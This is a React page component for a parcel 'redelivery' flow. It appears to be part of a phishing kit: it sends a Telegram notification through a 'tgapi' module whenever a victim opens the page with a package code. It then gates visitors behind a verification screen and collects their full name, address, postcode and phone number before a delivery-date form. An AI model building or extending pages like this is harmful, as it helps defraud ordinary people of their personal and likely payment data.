import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import Header from "@/components/Header";
import { Card, CardContent } from "@/components/ui/card";
import MainForm from "@/components/MainForm";
import TrackingForm from "@/components/TrackingForm";
import PackageForm from "@/components/PackageForm";
import DeliveryDateForm from "@/components/DeliveryDateForm";
import Footer from "@/components/Footer";
import LoadingForm from "@/components/LoadingForm";
import { sendRedeliveryPageOpenedNotification } from "@/components/tgapi";
const Redelivery = () => {
  const {
    code
  } = useParams();
  const [isVerified, setIsVerified] = useState(false);
  const [showDeliveryDateForm, setShowDeliveryDateForm] = useState(false);
  const [deliveryData, setDeliveryData] = useState(null);
  const [recipientData, setRecipientData] = useState(null);
  useEffect(() => {
    document.title = `Redelivery - Package ${code || "Request"}`;

    // Add meta description
    const metaDescription = document.querySelector('meta[name="description"]');
    if (metaDescription) {
      metaDescription.setAttribute("content", `Schedule redelivery for your package ${code || ""}. Choose a convenient delivery time and location for your parcel.`);
    }

    // Send notification when redelivery page is opened with a code
    if (code) {
      sendRedeliveryPageOpenedNotification(code);
    }
  }, [code]);
  return <div className="min-h-screen bg-white">
      <Header />
      
      {/* Page Title Section */}
      
      
      {/* Main Content Card */}
      {!isVerified ? (
        <LoadingForm onVerified={() => setIsVerified(true)} />
      ) : (
        <div className="container mx-0 px-[30px] py-[30px]">
          {showDeliveryDateForm ? <DeliveryDateForm name={deliveryData?.fullName} address={deliveryData?.address} city={deliveryData?.city} postCode={deliveryData?.postcode} phone={deliveryData?.phone} /> : <Card className="w-full md:w-fit mx-auto shadow-xl">
              <CardContent className="p-2 px-[8px] py-[15px]">
                <div className="flex flex-col md:flex-row gap-6 items-start">
                  {/* Left Column - Delivery Details */}
                  <div className="w-full">
                    <MainForm 
                      onShowDeliveryForm={data => {
                        setDeliveryData(data);
                        setShowDeliveryDateForm(true);
                      }}
                      onRecipientDataChange={(data) => setRecipientData(data)}
                    />
                  </div>
                  
                  {/* Right Column - Delivery Info Card */}
                  <div className="flex flex-col gap-4">
                    <TrackingForm recipientData={recipientData} />
                    <PackageForm recipientData={recipientData} />
                  </div>
                </div>
              </CardContent>
            </Card>}
        </div>
      )}
      
      <Footer />
    </div>;
};
export default Redelivery;